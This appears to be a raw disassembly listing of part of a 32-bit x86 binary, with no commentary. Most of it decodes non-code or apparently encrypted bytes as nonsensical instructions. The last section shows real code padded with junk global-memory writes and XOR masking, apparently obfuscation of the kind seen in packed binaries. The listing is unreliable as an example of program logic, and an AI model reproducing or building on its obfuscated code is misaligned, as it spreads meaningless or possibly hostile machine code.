  40318d:	mov    WORD PTR [eax-0x5695f384],gs
  403193:	sbb    eax,0x4d6edc98
  403198:	cmp    eax,0x17021782
  40319d:	mov    ecx,0xe4802f8f
  4031a2:	sti    
  4031a3:	or     cl,BYTE PTR [edi]
  4031a5:	das    
  4031a6:	and    DWORD PTR [eax-0x635a7afa],esp
  4031ac:	or     al,0xa2
  4031ae:	mov    dl,0x93
  4031b0:	cli    
  4031b1:	pop    ss
  4031b2:	imul   ah
  4031b4:	sub    esp,DWORD PTR [edi-0x8]
  4031b7:	popf   
  4031b8:	lahf   
  4031b9:	out    dx,al
  4031ba:	mov    edx,0xcf0bd701
  4031bf:	jnp    0x403147
  4031c1:	repnz cs pop ecx
  4031c4:	adc    BYTE PTR [ebx+0x63],0x1f
  4031c8:	mov    edx,0x75aed3a4
  4031cd:	sar    ecx,cl
  4031cf:	mov    bl,0xfe
  4031d1:	es out dx,eax
  4031d3:	adc    edi,DWORD PTR [ecx+0x7668cbbf]
  4031d9:	inc    ebp
  4031da:	fidiv  WORD PTR ds:0x90f1704f
  4031e0:	iret   
  4031e1:	xlat   BYTE PTR ds:[ebx]
  4031e2:	sub    eax,esi
  4031e4:	imul   eax,DWORD PTR [ebp-0x5d],0xffffffd4
  4031e8:	dec    ebp
  4031e9:	dec    ecx
  4031ea:	lods   eax,DWORD PTR ds:[esi]
  4031eb:	inc    esp
  4031ec:	mov    ch,0xac
  4031ee:	sbb    al,BYTE PTR [edi+ebp*8+0x6e]
  4031f2:	pop    esp
  4031f3:	add    BYTE PTR [ebx],ch
  4031f5:	or     eax,0x1de94b29
  4031fa:	adc    BYTE PTR [edx],dl
  4031fc:	pop    ebp
  4031fd:	sahf   
  4031fe:	scas   eax,DWORD PTR es:[edi]
  4031ff:	xor    BYTE PTR [ebp+0x5af2cb64],cl
  403205:	push   ds
  403206:	jp     0x403270
  403208:	and    eax,DWORD PTR [ebx]
  40320a:	push   esi
  40320b:	dec    esp
  40320c:	cdq    
  40320d:	sbb    al,0xbb
  40320f:	mov    dh,0x3c
  403211:	out    0x3d,eax
  403213:	(bad)  
  403214:	inc    edi
  403215:	loop   0x40325f
  403217:	(bad)
  40321a:	mov    WORD PTR [ebx+edi*2+0x3c],ds
  40321e:	cmp    BYTE PTR [ebp+0x6eb40a73],al
  403224:	sti    
  403225:	imul   edx,esi,0x82888b9c
  40322b:	lock js 0x40322c
  40322e:	fisub  DWORD PTR [edi-0x77e8a7eb]
  403234:	arpl   WORD PTR [ecx-0x59],di
  403237:	popa   
  403238:	mov    di,0xea63
  40323c:	jmp    0x4031e2
  40323e:	inc    ebx
  40323f:	xor    esi,edi
  403241:	xchg   edx,eax
  403242:	sub    DWORD PTR [edx-0x2ab226b4],edx
  403248:	xchg   ecx,eax
  403249:	inc    ebx
  40324a:	ins    DWORD PTR es:[edi],dx
  40324b:	push   ebx
  40324c:	cld    
  40324d:	push   ebx
  40324e:	mov    dh,0x5c
  403250:	loope  0x403230
  403252:	mov    bl,0x25
  403255:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403256:	jnp    0x403258
  403258:	xchg   ah,bh
  40325a:	mov    al,0x3a
  40325c:	outs   dx,BYTE PTR ds:[esi]
  40325d:	jg     0x4032aa
  40325f:	inc    DWORD PTR [edx]
  403261:	dec    edx
  403262:	fwait
  403263:	jae    0x40326a
  403265:	out    dx,al
  403266:	sbb    al,0x53
  403268:	sub    al,0x97
  40326a:	sub    dl,ah
  40326c:	ds jge 0x4032b1
  40326f:	cs mov al,0x55
  403272:	cmp    edx,DWORD PTR [edx]
  403274:	dec    ebp
  403275:	mov    WORD PTR es:[ebx],?
  403278:	outs   dx,DWORD PTR ds:[esi]
  403279:	mov    eax,0xb9479303
  40327e:	test   esp,esp
  403280:	push   esp
  403281:	jns    0x4032ff
  403283:	dec    eax
  403284:	inc    eax
  403285:	dec    esi
  403286:	arpl   WORD PTR [esi],si
  403288:	and    esi,DWORD PTR [edi-0x51]
  40328b:	cs adc esp,eax
  40328e:	dec    eax
  40328f:	das    
  403290:	ret    
  403291:	cmp    al,BYTE PTR [esi]
  403293:	dec    ecx
  403294:	add    DWORD PTR [ecx-0x6f46c73],0xffffffc4
  40329b:	std    
  40329c:	xchg   ebp,eax
  40329d:	fadd   DWORD PTR [edi+0x59d2a894]
  4032a3:	mov    ds:0xdf7431f9,eax
  4032a8:	pop    esp
  4032a9:	test   eax,0x128b1926
  4032ae:	fwait
  4032af:	jl     0x403282
  4032b1:	rol    BYTE PTR [eax+0x1e719a25],0x22
  4032b8:	test   ebx,esi
  4032ba:	push   cs
  4032bb:	outs   dx,DWORD PTR ds:[esi]
  4032bc:	scas   al,BYTE PTR es:[edi]
  4032bd:	pop    ss
  4032be:	es dec edx
  4032c0:	popa   
  4032c1:	xor    esp,DWORD PTR ds:0x27c9605c
  4032c7:	xchg   ecx,eax
  4032c8:	clc    
  4032c9:	pushf  
  4032ca:	dec    esi
  4032cb:	and    al,0xa2
  4032cd:	imul   ebp,DWORD PTR ds:0xc6e12d73,0xb361d38
  4032d7:	mov    edx,0x77f9b84a
  4032dc:	sub    DWORD PTR [eax+0xe22e04],ecx
  4032e2:	xchg   DWORD PTR [ebx],edi
  4032e4:	leave  
  4032e5:	fld    DWORD PTR [ebx+edx*2]
  4032e8:	mov    ebx,0x75a6789f
  4032ed:	into   
  4032ee:	lods   eax,DWORD PTR ds:[esi]
  4032ef:	inc    ebp
  4032f0:	pusha  
  4032f1:	ud2    
  4032f3:	inc    ebp
  4032f4:	mov    bl,0x32
  4032f6:	es pop ss
  4032f8:	mov    ebx,0x65e96f1b
  4032fd:	jnp    0x403367
  4032ff:	adc    al,BYTE PTR [eax+0x22e4e9d9]
  403305:	lods   eax,DWORD PTR ds:[esi]
  403306:	dec    esi
  403307:	jecxz  0x403346
  403309:	loopne 0x403371
  40330b:	les    ecx,FWORD PTR [ebp-0x4d]
  40330e:	rcr    DWORD PTR [ebp-0x66797f52],1
  403314:	leave  
  403315:	aaa    
  403316:	cmp    eax,DWORD PTR [ebp+0x5c]
  403319:	loope  0x40333d
  40331b:	mov    bh,0xdd
  40331d:	jns    0x4032c3
  40331f:	sub    DWORD PTR [ecx],edx
  403321:	ins    DWORD PTR es:[edi],dx
  403322:	mov    bh,0x90
  403324:	std    
  403325:	aas    
  403326:	push   ebx
  403327:	cmp    al,0xcd
  403329:	xchg   ebp,eax
  40332a:	std    
  40332b:	xchg   ebx,eax
  40332c:	outs   dx,DWORD PTR ds:[esi]
  40332d:	add    eax,0xcaa6897b
  403332:	dec    edx
  403333:	pushf  
  403334:	xor    bh,al
  403336:	pop    ebp
  403337:	mov    ds:0xef66eaf3,al
  40333c:	xor    DWORD PTR ds:[esi+0x25],ebx
  403340:	mov    dl,0x9
  403342:	sbb    al,0x33
  403344:	dec    ebx
  403345:	or     ch,cl
  403347:	xor    dl,BYTE PTR ds:0x62edcbc1
  40334d:	jmp    0x403335
  40334f:	pop    edi
  403350:	jmp    FWORD PTR [edx-0x23917da8]
  403356:	inc    edi
  403357:	cmp    BYTE PTR [ebx+0x3417ef84],dh
  40335d:	xor    eax,DWORD PTR [ebx+0x69a80997]
  403363:	mov    BYTE PTR [edi],dh
  403365:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403366:	fcmovne st,st(3)
  403368:	arpl   WORD PTR [esi-0x707b6997],bp
  40336e:	pop    edi
  40336f:	lods   al,BYTE PTR ds:[esi]
  403370:	sub    al,0x52
  403372:	cdq    
  403373:	ja     0x403377
  403375:	fisub  DWORD PTR [ebp+esi*4+0x7b]
  403379:	fwait
  40337a:	xor    BYTE PTR [ebx],dl
  40337c:	das    
  40337d:	inc    ebp
  40337e:	mov    ecx,0x26e99ec2
  403383:	dec    ebp
  403384:	push   0xffa23192
  403389:	das    
  40338a:	xchg   BYTE PTR [esi],cl
  40338c:	xchg   ecx,eax
  40338d:	mov    dl,0x44
  40338f:	jp     0x4033e9
  403391:	cmp    eax,0x6d661d
  403396:	arpl   WORD PTR [edx-0x61],si
  403399:	jae    0x40331f
  40339b:	jae    0x4033f1
  40339d:	dec    ecx
  40339e:	or     al,0x77
  4033a0:	mov    al,ss:0x3d430bc3
  4033a6:	dec    esp
  4033a7:	mov    dl,0xdc
  4033a9:	test   al,0xbe
  4033ab:	mov    ecx,ebp
  4033ad:	std    
  4033ae:	in     eax,dx
  4033af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033b0:	nop
  4033b1:	fcmovb st,st(0)
  4033b3:	mov    ebx,DWORD PTR ds:0x771cc3f5
  4033b9:	add    eax,edx
  4033bb:	and    edi,DWORD PTR [edi]
  4033bd:	lock fs dec edx
  4033c0:	retf   
  4033c1:	sbb    cl,BYTE PTR [esi]
  4033c3:	lds    edi,FWORD PTR [edx+0x26]
  4033c6:	sahf   
  4033c7:	xchg   DWORD PTR [esi+ebx*4+0x40f6e773],esp
  4033ce:	cmc    
  4033cf:	mov    bl,0xb0
  4033d1:	add    ecx,DWORD PTR [edx+0x49]
  4033d4:	sti    
  4033d5:	dec    ebp
  4033d6:	daa    
  4033d7:	inc    ebp
  4033d8:	cmp    al,0xb0
  4033da:	mov    al,ds:0x6e604094
  4033df:	dec    esi
  4033e0:	jl     0x4033de
  4033e2:	not    DWORD PTR [edi]
  4033e4:	data16 jg 0x40345a
  4033e7:	inc    edi
  4033e8:	mov    eax,0x20af2497
  4033ed:	add    ch,dl
  4033ef:	sub    BYTE PTR [edx+0x33],al
  4033f2:	stc    
  4033f3:	and    BYTE PTR [ebp-0x7c],dl
  4033f6:	mov    edx,0x5d5e7e7e
  4033fb:	push   edx
  4033fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033fd:	neg    dh
  4033ff:	mov    ecx,0x47a2559a
  403404:	mov    edi,0xa69b47a5
  403409:	and    eax,DWORD PTR [edx-0x78]
  40340c:	pop    edi
  40340d:	call   0xd5c4:0xca62d18b
  403414:	add    bl,BYTE PTR [ecx+0x62]
  403417:	xchg   ebx,eax
  403418:	xor    ebx,eax
  40341a:	cmp    eax,0x196c4f6e
  40341f:	pop    ds
  403420:	cmp    cl,ah
  403422:	loopne 0x403475
  403424:	call   0xcdce:0x63cd4f75
  40342b:	xlat   BYTE PTR ds:[ebx]
  40342c:	ds scas eax,DWORD PTR es:[edi]
  40342e:	xor    DWORD PTR [ecx-0x69cbf7c9],0xffffffe7
  403435:	and    BYTE PTR [ecx+0x64],dl
  403438:	inc    ebx
  403439:	jmp    0x4034ad
  40343b:	inc    ecx
  40343c:	xchg   esp,eax
  40343d:	fs xchg esi,eax
  40343f:	hlt    
  403440:	xor    al,0xce
  403442:	sahf   
  403443:	dec    esi
  403444:	rol    BYTE PTR [eax],1
  403446:	xchg   ebp,eax
  403447:	lds    ebx,FWORD PTR [ecx+0x28106fc8]
  40344d:	dec    esp
  40344e:	sbb    BYTE PTR [edi-0x16],dh
  403451:	scas   al,BYTE PTR es:[edi]
  403452:	inc    esp
  403453:	jl     0x4033ea
  403455:	jno    0x403433
  403457:	in     eax,dx
  403458:	mov    ebx,0xceed1bdc
  40345d:	imul   ecx,DWORD PTR [ebp+0xccd1111],0xffffffe9
  403464:	dec    edi
  403465:	pop    ebx
  403466:	inc    ecx
  403467:	(bad)
  40346b:	push   ss
  40346c:	je     0x4034b6
  40346e:	addr16 hlt 
  403470:	pushf  
  403471:	loope  0x403461
  403473:	sbb    esi,DWORD PTR [ecx+0x7f]
  403476:	popa   
  403477:	pop    es
  403478:	mov    ds:0xdd4ff448,al
  40347d:	pop    esp
  40347e:	jp     0x4034d8
  403480:	cmp    al,bh
  403482:	push   cs
  403483:	mov    eax,fs
  403485:	neg    BYTE PTR [eax-0x25]
  403488:	inc    ecx
  403489:	aad    0xe0
  40348b:	push   edi
  40348c:	fwait
  40348d:	mov    edi,0xa6ae96eb
  403492:	inc    esi
  403493:	or     BYTE PTR [edi+ecx*4+0x57],bl
  403497:	mov    al,ds:0x92745c89
  40349c:	sbb    BYTE PTR [edi],bh
  40349e:	add    al,0xd7
  4034a0:	cmc    
  4034a1:	out    dx,al
  4034a2:	dec    esi
  4034a3:	pop    edi
  4034a4:	bound  eax,QWORD PTR cs:[ebx]
  4034a7:	or     ebx,DWORD PTR [eax]
  4034a9:	jl     0x403473
  4034ab:	outs   dx,DWORD PTR ds:[esi]
  4034ac:	jmp    0x40343e
  4034ae:	test   edi,0xe0d0d080
  4034b4:	add    eax,0x702debe5
  4034b9:	(bad)  
  4034ba:	jg     0x4034d4
  4034bc:	xchg   esi,eax
  4034bd:	in     eax,dx
  4034be:	ret    0xa9c1
  4034c1:	lods   al,BYTE PTR ds:[esi]
  4034c2:	repnz out dx,eax
  4034c4:	push   ecx
  4034c5:	push   ds
  4034c6:	adc    eax,0x972bf1fc
  4034cb:	mov    es,WORD PTR [ebp-0x75]
  4034ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034cf:	jmp    0x403519
  4034d1:	pop    ds
  4034d2:	pop    es
  4034d3:	or     al,BYTE PTR ds:0x9f4b384d
  4034d9:	mov    DWORD PTR [esi-0x3fad91cf],edi
  4034df:	mul    BYTE PTR [edx+0x2e6c1f57]
  4034e5:	adc    BYTE PTR [ebx+eiz*2],dh
  4034e8:	jle    0x403559
  4034ea:	xor    BYTE PTR [eax+0x6a],bl
  4034ed:	pop    esp
  4034ee:	stc    
  4034ef:	jne    0x4034e6
  4034f1:	loop   0x40348f
  4034f3:	cld    
  4034f4:	jg     0x40354b
  4034f6:	jnp    0x4034c4
  4034f8:	push   esi
  4034f9:	retf   0x3780
  4034fc:	pop    esp
  4034fd:	hlt    
  4034fe:	stos   BYTE PTR es:[edi],al
  4034ff:	leave  
  403500:	jbe    0x4034a2
  403502:	jae    0x4034c9
  403504:	loope  0x403523
  403506:	adc    bh,BYTE PTR [ecx+esi*1-0x2b]
  40350a:	in     eax,dx
  40350b:	fnsave [edx]
  40350d:	data16 jbe 0x403544
  403510:	mov    ebp,0x915a9c51
  403515:	inc    ebp
  403516:	fs dec ebp
  403518:	rol    WORD PTR [edx+0x70],1
  40351c:	push   eax
  40351d:	sbb    dl,al
  40351f:	outs   dx,BYTE PTR ds:[esi]
  403520:	and    DWORD PTR [eax-0x17],esp
  403523:	pushf  
  403524:	inc    ebp
  403525:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403526:	jg     0x40359d
  403528:	and    BYTE PTR [ecx+edi*2+0x7],al
  40352c:	repz aas 
  40352e:	add    cl,BYTE PTR [ebp-0x19]
  403531:	jl     0x4034da
  403533:	shl    BYTE PTR [ebx+esi*2+0x2db85e60],1
  40353a:	mov    esp,0x56261277
  40353f:	mov    esp,0x9ca4f790
  403544:	add    eax,0xe0b7dd8c
  403549:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40354a:	mul    BYTE PTR [esi-0x60dd9dc]
  403550:	mov    ebp,0x7c0b82d1
  403555:	fisubr WORD PTR [ecx+edx*2-0x62]
  403559:	mov    eax,0x690cbc50
  40355e:	cld    
  40355f:	pop    edi
  403560:	cld    
  403561:	mov    WORD PTR [ebx],gs
  403563:	sbb    esi,ebp
  403565:	hlt    
  403566:	ds push esp
  403568:	in     al,0x6b
  40356a:	or     al,0xbc
  40356c:	test   eax,0x86efeda8
  403571:	push   eax
  403572:	in     al,dx
  403573:	xor    BYTE PTR [ecx-0x7f5c84ec],bh
  403579:	or     al,0x83
  40357b:	cmp    esi,esp
  40357d:	jl     0x4035cf
  40357f:	xor    al,0xe9
  403581:	aam    0xaa
  403583:	xor    BYTE PTR [ebx-0x52],bh
  403586:	pop    esp
  403587:	ja     0x40358e
  403589:	jecxz  0x4035f5
  40358b:	push   esp
  40358c:	popf   
  40358d:	(bad)  
  40358e:	stos   BYTE PTR es:[edi],al
  40358f:	mov    ch,0x87
  403591:	retf   
  403592:	leave  
  403593:	and    BYTE PTR [eax+0x5d294288],bh
  403599:	mov    BYTE PTR [esi-0x2e8a0203],0xb4
  4035a0:	mov    DWORD PTR [esp+edi*4-0x39],ebp
  4035a4:	iret   
  4035a5:	pop    esi
  4035a6:	mov    dh,0x52
  4035a8:	sub    al,0x44
  4035aa:	push   eax
  4035ab:	xchg   ebp,eax
  4035ac:	adc    al,bl
  4035ae:	add    ah,dh
  4035b0:	mov    BYTE PTR [esi-0x2b],dh
  4035b3:	out    0xd3,eax
  4035b5:	cwde   
  4035b6:	xchg   edi,eax
  4035b7:	and    eax,0xfb26fa6c
  4035bc:	(bad)  
  4035be:	cmp    DWORD PTR [edi-0x54],eax
  4035c1:	jmp    0x4035ff
  4035c3:	xlat   BYTE PTR ds:[ebx]
  4035c4:	adc    al,0x12
  4035c6:	xchg   edi,eax
  4035c7:	(bad)
  4035cc:	mov    ebp,0xa8f2a4b3
  4035d1:	shl    DWORD PTR [edi],0x9c
  4035d4:	and    eax,0x2dceed1a
  4035d9:	xchg   dl,cl
  4035db:	inc    edx
  4035dc:	cmc    
  4035dd:	sub    al,0x31
  4035df:	out    0xdb,al
  4035e1:	ja     0x4035e0
  4035e3:	out    0xd5,al
  4035e5:	mov    esp,eax
  4035e7:	mov    esi,0x36688e2
  4035ec:	jae    0x40358f
  4035ee:	sub    al,0x0
  4035f0:	or     BYTE PTR [ecx-0x72f56e8b],ch
  4035f6:	pop    edx
  4035f7:	jmp    0x403624
  4035f9:	push   ds
  4035fa:	fimul  DWORD PTR [ebx]
  4035fc:	cwde   
  4035fd:	mov    eax,ds:0x898f7ba5
  403602:	pop    ds
  403603:	repnz xor DWORD PTR [ebx],esp
  403606:	mov    ah,0x1b
  403608:	aas    
  403609:	out    dx,eax
  40360a:	push   edi
  40360b:	mov    cl,0x21
  40360d:	leave  
  40360e:	push   edi
  40360f:	and    dl,BYTE PTR [ebx+0x55]
  403612:	sub    eax,ebp
  403614:	std    
  403615:	inc    ebx
  403616:	mov    DWORD PTR [eax-0x3bc671db],0xbe679a48
  403620:	sub    dh,BYTE PTR [esp+edi*2]
  403623:	push   edi
  403624:	ret    0x71ec
  403627:	dec    edx
  403628:	out    0xff,al
  40362a:	jp     0x403622
  40362c:	in     al,0x3e
  40362e:	add    DWORD PTR [edi*4-0x65fce1f9],eax
  403635:	ins    DWORD PTR es:[edi],dx
  403636:	push   cs
  403637:	aad    0x5f
  403639:	mov    eax,ds:0x5eab1c94
  40363e:	push   esi
  40363f:	push   edx
  403640:	and    eax,0xad9f00d1
  403645:	mov    ss,WORD PTR [esp+eax*2-0x261f164c]
  40364c:	cmc    
  40364d:	aaa    
  40364e:	add    eax,0x8bc1a66b
  403653:	fdivr  st,st(4)
  403655:	addr16 pop ebx
  403657:	addr16 jae 0x4035e5
  40365a:	idiv   ebx
  40365c:	xchg   edi,eax
  40365d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40365e:	out    dx,eax
  40365f:	or     eax,0x4367f9b
  403664:	ds pop ecx
  403666:	and    al,0x7d
  403668:	adc    eax,0x4cdb5805
  40366d:	sti    
  40366e:	add    DWORD PTR [eax],ebp
  403670:	inc    edx
  403671:	fdiv   QWORD PTR [edi+0x7c]
  403674:	and    dl,bl
  403676:	mov    edi,0x7451179c
  40367b:	mov    cs,WORD PTR [esi-0x13]
  40367e:	push   cs
  40367f:	stc    
  403680:	jb     0x4036e8
  403682:	retf   0xe949
  403685:	and    bl,al
  403687:	cmp    ecx,eax
  403689:	out    0x5f,al
  40368b:	jns    0x403659
  40368d:	rol    BYTE PTR [edi-0x5de47bcb],0x8d
  403694:	mov    eax,ds:0x9d07bd47
  403699:	mov    cl,0x83
  40369b:	aas    
  40369c:	or     BYTE PTR [ebp-0x26],0xed
  4036a0:	push   0xf
  4036a2:	jl     0x40370d
  4036a4:	stc    
  4036a5:	stos   DWORD PTR es:[edi],eax
  4036a6:	and    bl,BYTE PTR [ecx+0xe]
  4036a9:	repz mov eax,ds:0xc839d315
  4036af:	dec    eax
  4036b0:	test   DWORD PTR [eax+0x49],esi
  4036b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036b4:	cs add cl,bl
  4036b7:	shr    BYTE PTR [eax],0x48
  4036ba:	mov    ds,WORD PTR [ebx+0x790c65b4]
  4036c0:	hlt    
  4036c1:	in     al,0xda
  4036c3:	inc    esp
  4036c4:	div    BYTE PTR [ecx+ebx*4+0x494676b2]
  4036cb:	aas    
  4036cc:	cmp    al,0x33
  4036ce:	or     DWORD PTR [eax-0x1829c6d9],edi
  4036d4:	pop    ecx
  4036d5:	cli    
  4036d6:	jle    0x4036ea
  4036d8:	int3   
  4036d9:	lea    edi,[ebp-0x5b]
  4036dc:	(bad)  
  4036dd:	pushf  
  4036de:	xchg   esi,eax
  4036df:	inc    ebp
  4036e0:	inc    esi
  4036e1:	sub    DWORD PTR [edx-0x5a],esi
  4036e4:	fadd   DWORD PTR [edx+0x10]
  4036e7:	add    eax,0x32355143
  4036ec:	imul   edi,DWORD PTR [eax+eax*2+0x5a716932],0x324c497c
  4036f7:	sub    DWORD PTR [esi-0x2a03c856],ebp
  4036fd:	ret    0x277a
  403700:	iret   
  403701:	ror    BYTE PTR ds:0x9f5fd2a1,cl
  403707:	cmp    eax,0x1f16e5d1
  40370c:	and    BYTE PTR [ebp+0x6e54eba6],cl
  403712:	dec    ecx
  403713:	sub    al,ch
  403715:	cmp    eax,0xb793da7
  40371a:	add    DWORD PTR [eax+0x2e],edi
  40371d:	push   ebx
  40371e:	dec    ebp
  40371f:	test   al,0xb2
  403721:	stos   DWORD PTR es:[edi],eax
  403722:	je     0x403772
  403724:	in     al,0xc9
  403726:	cmp    al,BYTE PTR [eax+0x785cc207]
  40372c:	add    eax,0x28346ebf
  403731:	xor    eax,0x69f609dc
  403736:	jnp    0x403767
  403738:	push   ss
  403739:	mov    esp,0x90e40ae2
  40373e:	adc    ch,BYTE PTR [ecx+0x10]
  403741:	cs push 0x14838f26
  403747:	repz push eax
  403749:	lock ss mov edx,0xd46aa3aa
  403750:	in     ax,dx
  403752:	cmp    BYTE PTR [edi-0x3c2dd098],cl
  403758:	dec    esi
  403759:	sbb    DWORD PTR [ebp+0x12de2b77],edi
  40375f:	adc    bh,BYTE PTR [ecx]
  403761:	aam    0xd
  403763:	bound  esp,QWORD PTR [esi+0x5218b9e]
  403769:	mov    dh,0xa1
  40376b:	sti    
  40376c:	pusha  
  40376d:	mov    ecx,0xdcf60d28
  403772:	mov    ds:0xa32946e5,eax
  403777:	fwait
  403778:	jno    0x4037a7
  40377a:	mov    edi,0xb8d0a1f
  40377f:	popf   
  403780:	test   eax,0x9b03921f
  403785:	jnp    0x403748
  403787:	pop    esp
  403788:	jle    0x403792
  40378a:	call   0x829e:0x8957bcc8
  403791:	adc    al,0x40
  403793:	or     dh,dh
  403795:	iret   
  403796:	neg    edx
  403798:	lea    esp,[ecx+0x3cc96c8b]
  40379e:	jecxz  0x403818
  4037a0:	dec    ebx
  4037a1:	out    dx,eax
  4037a2:	pop    ds
  4037a3:	sbb    al,0x54
  4037a5:	sbb    ebx,DWORD PTR ds:0xfd5fdd87
  4037ab:	nop
  4037ac:	pop    edi
  4037ad:	sub    cl,BYTE PTR [edi]
  4037af:	xchg   esp,eax
  4037b0:	and    bl,BYTE PTR [ebp+0x5]
  4037b3:	inc    edx
  4037b4:	loop   0x403833
  4037b6:	in     eax,dx
  4037b7:	xlat   BYTE PTR ds:[ebx]
  4037b8:	mov    dl,0x49
  4037ba:	push   eax
  4037bb:	or     DWORD PTR [edi-0x7a],ebp
  4037be:	loop   0x403768
  4037c0:	push   es
  4037c1:	jl     0x4037ec
  4037c3:	inc    esi
  4037c4:	addr16 inc ebp
  4037c6:	pop    esi
  4037c7:	add    eax,0xd02adf6e
  4037cc:	or     BYTE PTR [edi+edi*2],ch
  4037cf:	sub    BYTE PTR gs:[edi+esi*4],dl
  4037d3:	sbb    DWORD PTR [ecx],ebx
  4037d5:	mov    edi,0x6dd0786e
  4037da:	rol    DWORD PTR [eax],0x81
  4037dd:	pop    ecx
  4037de:	bound  ebx,QWORD PTR [ecx+0x65cc07a6]
  4037e4:	adc    BYTE PTR [edi+0x6221ab8c],0x96
  4037eb:	mov    ebp,0x1ec1b698
  4037f0:	push   es
  4037f1:	jnp    0x403814
  4037f3:	inc    ebp
  4037f4:	dec    DWORD PTR [ebp+0x66]
  4037f7:	mov    eax,0xe70751aa
  4037fc:	cld    
  4037fd:	fcomi  st,st(6)
  4037ff:	sbb    DWORD PTR [edi+edi*1],0x6326b9d1
  403806:	leave  
  403807:	inc    edi
  403808:	fldenv [ebp+0x1d0b3dec]
  40380e:	dec    edx
  40380f:	dec    edi
  403810:	mov    BYTE PTR [ecx],cl
  403812:	imul   edi,DWORD PTR [esi+0x3b],0xffffff8b
  403816:	inc    ebp
  403817:	lock mov ecx,DWORD PTR [ebp-0x10]
  40381b:	xor    eax,esi
  40381d:	xor    ecx,esi
  40381f:	sub    DWORD PTR ds:0x428eb3,0x5e8a
  403829:	lea    ecx,[eax+ecx*1+0x64e5ec]
  403830:	mov    eax,DWORD PTR [ebp-0xc]
  403833:	sbb    DWORD PTR ds:0x428e97,0x428e5b
  40383d:	xor    edx,edx
  40383f:	adc    DWORD PTR ds:0x428e4b,0x428eab
  403849:	div    ecx
  40384b:	movzx  eax,WORD PTR ds:0x428e2b
  403852:	add    DWORD PTR ds:0x428eb3,eax
  403858:	mov    eax,DWORD PTR [ebp-0x8]
  40385b:	mov    DWORD PTR ds:0x428e57,0x1e
  403865:	cmp    DWORD PTR ds:0x428e57,0x0
  40386c:	je     0x4038bb
  403872:	cmp    DWORD PTR ds:0x428e57,0x9
  403879:	jb     0x4038bb
  40387f:	jmp    0x40388d
  403884:	push   DWORD PTR [ebp-0x10]
  403887:	call   DWORD PTR ds:0x42aa1b
  40388d:	cmp    DWORD PTR ds:0x428e57,0xa
  403894:	jne    0x4038a7
  40389a:	mov    ecx,DWORD PTR ds:0x428e57
  4038a0:	dec    ecx
  4038a1:	mov    DWORD PTR ds:0x428e57,ecx
  4038a7:	xor    ecx,ecx
  4038a9:	add    ecx,DWORD PTR ds:0x428e57
  4038af:	dec    ecx
  4038b0:	mov    DWORD PTR ds:0x428e57,ecx
  4038b6:	jmp    0x403865
  4038bb:	mov    ecx,DWORD PTR [ebp-0x10]
  4038be:	xor    eax,esi
  4038c0:	xor    ecx,esi
  4038c2:	sub    eax,ecx
  4038c4:	mov    DWORD PTR ds:0x428e43,0x1a6e
  4038ce:	cmp    edx,eax
  4038d0:	mov    DWORD PTR ds:0x428e43,0x4c12
  4038da:	jne    0x403ae6
  4038e0:	mov    eax,DWORD PTR [ebp-0xc]
  4038e3:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  4038ea:	sbb    eax,DWORD PTR ds:0x428ec3
  4038f0:	mov    eax,DWORD PTR [ebp-0x28]
  4038f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4038f6:	or     DWORD PTR ds:0x428ec3,0x7d0f
  403900:	xor    eax,esi
  403902:	xor    ecx,esi
  403904:	add    eax,edi
  403906:	add    ecx,edi
  403908:	mov    BYTE PTR [ebp-0x21],dl
  40390b:	mov    DWORD PTR ds:0x428e57,0x12ce
  403915:	cmp    eax,ecx
  403917:	mov    DWORD PTR ds:0x428eab,0x3e33
  403921:	jae    0x403a8f
  403927:	mov    edx,DWORD PTR ds:0x428e57
  40392d:	xor    DWORD PTR ds:0x428e87,edx
  403933:	lea    ecx,[eax-0x3272f6]
  403939:	mov    DWORD PTR [ebp-0x14],ecx
  40393c:	and    DWORD PTR ds:0x428e73,0x0
  403946:	mov    edx,DWORD PTR ds:0x428e73
  40394c:	inc    edx
  40394d:	mov    DWORD PTR ds:0x428e73,edx
  403953:	cmp    DWORD PTR ds:0x428e73,0x20
  40395a:	ja     0x403980
  403960:	jmp    0x403973
  403965:	push   0x428e8b
  40396a:	push   DWORD PTR [ebp-0xc]
  40396d:	call   DWORD PTR ds:0x42aa1f
  403973:	cmp    DWORD PTR ds:0x428e73,0x11
  40397a:	jb     0x403946
  403980:	mov    edx,DWORD PTR [ebp-0x14]
  403983:	or     DWORD PTR ds:0x428e6b,0xd5d
  40398d:	xor    edx,esi
  40398f:	xor    DWORD PTR ds:0x428e83,0x428e5f
  403999:	add    edx,0x7f55d8e3
  40399f:	lea    ecx,[ebp+eax*4-0xb4]
  4039a6:	mov    DWORD PTR [ecx],edx
  4039a8:	mov    DWORD PTR ds:0x428e47,0xcba
  4039b2:	mov    edx,DWORD PTR [ecx]
  4039b4:	mov    DWORD PTR ds:0x428e2b,0xfd2
  4039be:	cmp    edx,0x244ecb82
  4039c4:	jbe    0x4039e9
  4039ca:	xor    DWORD PTR ds:0x428ea3,0x47b3
  4039d4:	add    DWORD PTR [ecx],0x405fcc1
  4039da:	mov    DWORD PTR ds:0x428e63,0x27c8
  4039e4:	jmp    0x4039f9
  4039e9:	or     DWORD PTR ds:0x428ea3,0x2c0c
  4039f3:	add    DWORD PTR [ecx],0xfdaf433f
  4039f9:	mov    ecx,DWORD PTR [ebp-0x18]
  4039fc:	and    DWORD PTR ds:0x428e27,0x4d72
  403a06:	xor    ecx,esi
  403a08:	xor    DWORD PTR ds:0x428ea3,0x741f
  403a12:	inc    eax
  403a13:	sub    DWORD PTR ds:0x428e37,0x428eb7
  403a1d:	inc    DWORD PTR [ebp-0x14]
  403a20:	add    ecx,edi
  403a22:	mov    DWORD PTR ds:0x428e47,0x2f68
  403a2c:	cmp    eax,ecx
  403a2e:	jb     0x40393c
  403a34:	and    DWORD PTR ds:0x428e9b,0x0
  403a3e:	mov    eax,ds:0x428e9b
  403a43:	inc    eax
  403a44:	mov    ds:0x428e9b,eax
